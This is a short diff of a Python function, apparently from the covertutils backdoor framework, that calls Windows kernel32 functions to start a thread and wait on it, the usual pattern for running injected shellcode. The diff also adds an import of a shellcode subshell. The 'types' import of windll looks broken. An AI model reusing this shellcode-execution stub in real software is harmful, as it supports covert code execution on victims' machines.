@@ -1,7 +1,4 @@
 
-
-
-
 def work( storage, message ) :
 
 	from types import windll, c_char_p
@@ -28,3 +25,6 @@ def work( storage, message ) :
 									  pointer(c_int(0)))
 	# Waits until the specified object is in the signaled state or the time-out interval elapses.
 	windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))
+
+
+from covertutils.shells.subshells import ShellcodeSubShell as shell
